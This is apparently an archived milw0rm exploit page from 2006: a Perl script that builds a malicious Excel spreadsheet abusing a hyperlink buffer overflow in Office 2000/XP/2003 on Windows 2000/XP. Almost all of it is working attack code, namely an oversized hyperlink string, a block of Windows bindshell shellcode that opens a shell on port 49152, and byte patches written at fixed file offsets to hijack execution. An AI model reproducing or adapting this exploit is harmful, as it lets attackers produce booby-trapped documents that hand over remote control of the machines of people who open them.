<html><head><title>Microsoft Excel Universal Hlink Local Buffer Overflow Exploit</title></head><pre>#############################################################
# excel hlink overflow UNIVERSAL poc by SYS 49152           #
# public version                                            #
#                                                           # 
# works with ANY of the following oses/office combinations: #
# -windows 2k sp4/XP SP1/XP SP2                             #
#                                                           #
# -office 2000/Xp/2003                                      #
#                                                           #
# bindshell on port 49152                                   #
#                                                           #
# thanks go to BuzzDee for some things..                    #
#                                                           #  
# credits to kcope for finding the vuln..                   #
#                                                           #
# I'm always ready to join groups, boards and the like..    #
#                                                           #
# for anything about this sploit you can drop a mail to     #
#                                                           #
# gforce(AT)operamail.com                                   #
#############################################################
use Spreadsheet::WriteExcel;

my $workbook = Spreadsheet::WriteExcel-&gt;new(&quot;SYS_49152_universal_hlink.xls&quot;);
$worksheet = $workbook-&gt;add_worksheet();

$format = $workbook-&gt;add_format();
$format-&gt;set_bold();
$format-&gt;set_color('black');
$format-&gt;set_align('center');

$col=7;
$worksheet-&gt;write($row, $col, &quot;excel overflow UNIVERSAL poc by SYS 49152 public version&quot;,$format);
$row = 2;   
$worksheet-&gt;write($row, $col, &quot;bindshell on port 49152&quot;, $format);
$row = 6 ;
$worksheet-&gt;write($row, $col, &quot;I'm always ready to join groups, boards and the like.. but skiddiefree..&quot;, $format);
$row = 7;
$worksheet-&gt;write($row, $col, &quot;gforce(AT)operamail.com&quot;, $format);
$row = 9;   
$worksheet-&gt;write($row, $col, &quot;thanks go to BuzzDee for some things..&quot;, $format);
$row = 11 ;  
$worksheet-&gt;write($row, $col, &quot;credits to kcope for finding the vuln..&quot;, $format);
$row = 16  ;
$worksheet-&gt;write($row, $col, &quot;DISCLAIMER: you are NOT allowed by me to use this poc for any kind of illegal activities..&quot;, $format);


$a=&quot;aaaaaaaaa\x53\x59\x53\x34\x39\x31\x35\x32\x52\x55\x4C\x45\x5Aaaaaaaaaa\\&quot; x 80;


my $shellcode = &quot;\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45&quot;.
&quot;\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49&quot;.
&quot;\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d&quot;.
&quot;\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66&quot;.
&quot;\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61&quot;.
&quot;\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40&quot;.
&quot;\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32&quot;.
&quot;\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6&quot;.
&quot;\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09&quot;.
&quot;\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0&quot;.
&quot;\x66\x68\xc0\x00\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff&quot;.
&quot;\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53&quot;.
&quot;\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff&quot;.
&quot;\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64&quot;.
&quot;\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89&quot;.
&quot;\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab&quot;.
&quot;\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51&quot;.
&quot;\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53&quot;.
&quot;\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6&quot;.
&quot;\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0&quot;;
 



$worksheet-&gt;write_url(0, 0, &quot;$a&quot;, &quot;ClickMe!&quot;);
$workbook-&gt;close();

open(ass, &quot;+&lt;SYS_49152_universal_hlink.xls&quot;) || die &quot;Can't Open temporary File\n&quot;;
seek ass,6854,0;
print ass $shellcode;
seek ass,7233,0;
print ass &quot;\xEB\xF4\x90\x90\x13\xAC\x8D\x30&quot;;
seek ass,7223,0;
print ass &quot;\xE9\x8A\xFE\xFF\xFF&quot;;
seek ass,6449,0;
print ass &quot;\xEB\x1A\x90\x90\x10\x14\xB3\x30&quot;;
seek ass,6477,0;
print ass &quot;\xEB\x7e\x90\x90\xB4\x9B\xCB\x30&quot;;
seek ass,6605,0;
print ass &quot;\xEB\x7e&quot;;
seek ass,6733,0;
print ass &quot;\xEB\x77&quot;;
print &quot;.xls file written correctly.\n&quot;;
close (ass);

# milw0rm.com [2006-07-02]</pre></html>